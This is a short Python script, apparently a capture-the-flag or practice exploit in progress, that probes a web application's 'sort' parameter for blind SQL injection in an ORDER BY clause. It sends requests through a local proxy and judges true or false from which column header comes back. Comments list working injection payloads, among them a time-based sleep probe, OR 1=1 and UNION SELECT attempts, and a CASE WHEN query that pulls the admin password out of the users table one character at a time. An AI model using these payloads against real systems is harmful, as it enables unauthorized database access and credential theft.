import requests
import urllib.parse
from bs4 import BeautifulSoup

URL = 'http://35.211.18.56:8000'

http_proxy  = "http://127.0.0.1:8080"
https_proxy = "http://127.0.0.1:8080"
ftp_proxy   = "http://127.0.0.1:8080"

proxyDict = { 
    "http"  : http_proxy, 
    "https" : https_proxy, 
    "ftp"   : ftp_proxy
}

# (SELECT jun2021)
# (SELECT (CASE WHEN 1=1 THEN sleep(1000) ELSE 'jun2021' END))

"""
SELECT date, date, lang, ratings, change
FROM
tables
ORDER BY (
    param
)
LIMIT 1000;
"""

# '' OR 1=1;--
# (CASE WHEN (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users where username = 0x61646D696E) = 65 THEN date ELSE title END)
# (CASE WHEN (SELECT 1) = 1 THEN jun2020 ELSE jun2021 END)
# '' UNION ALL SELECT 1, 1, "rust", 12.5, 12.5, 12.5;--
# '' UNION ALL SELECT 1, 1, "rust", 12.5, 12.5, 12.5;--

query_string = "(CASE WHEN (SELECT 1) = 1 THEN jun2020 ELSE jun2021 END)"
QUERY = urllib.parse.quote_plus(query_string)

res = requests.get(f"{URL}/?sort={QUERY}", proxies=proxyDict)

true_condition = '<th style="width: 20%">↓ <a href="/?sort=jun2021">Jun 2021</a></th>'
false_condition = '<th style="width: 20%">↓ <a href="/?sort=jun2020">Jun 2020</a></th>'

print(true_condition in res.text)
print(false_condition in res.text)


soup = BeautifulSoup(res.text, 'html')

breakpoint()